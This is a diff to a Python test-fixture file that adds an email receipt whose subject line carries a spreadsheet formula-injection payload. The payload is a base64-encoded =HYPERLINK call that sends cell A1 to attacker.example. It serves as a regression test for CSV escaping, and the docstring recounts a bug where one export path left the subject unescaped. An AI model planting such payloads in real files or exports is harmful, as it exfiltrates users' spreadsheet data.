@@ -315,6 +315,33 @@ def foreign_offset_boundary() -> bytes:
     return head + "合計 ¥630\n".encode("utf-8")
 
 
+# ---------------------------------------------------------------- 11
+def formula_subject() -> bytes:
+    """件名が数式に見える領収書。
+
+    件名は送りつける側が完全に自由に決められる。CSV に素通しすると
+    表計算ソフトが開いた瞬間に数式として実行するので、両実装とも
+    先頭に ' を付けて文字列に落とさなければならない。
+
+    ここが割れたのは実際に起きたことで、2026-07-26 に summary 側だけ
+    対策を入れ、detail 側は掛け忘れていた。ブラウザ版は全セルを通す
+    関所になっていて漏れていなかったため、**同じ道具の中で実装が
+    割れていた**。出力層が照合対象の外にあったので気づけなかった。
+    """
+    head = crlf(
+        "From: Example Store <billing@store.example>\n"
+        "To: user@example.com\n"
+        "Subject: =?UTF-8?B?" + base64.b64encode(
+            '=HYPERLINK("http://attacker.example/?d="&A1,"click")'.encode()
+        ).decode() + "?=\n"
+        "Date: Wed, 15 Jul 2026 10:43:00 +0900\n"
+        "Message-ID: <fixture-11@example.invalid>\n"
+        "Content-Type: text/plain; charset=UTF-8\n"
+        "Content-Transfer-Encoding: 8bit\n"
+        "\n"
+    )
+    return head + "合計 ¥630\n".encode("utf-8")
+
 FIXTURES = {
     "01-iso2022jp-escape.eml": iso2022jp_escape,
     "02-html-entity-amount.eml": html_entity_amount,
@@ -326,6 +353,7 @@ FIXTURES = {
     "08-timezone-boundary.eml": timezone_boundary,
     "09-html-cell-boundary.eml": html_cell_boundary,
     "10-foreign-offset-boundary.eml": foreign_offset_boundary,
+    "11-formula-subject.eml": formula_subject,
 }
 
 
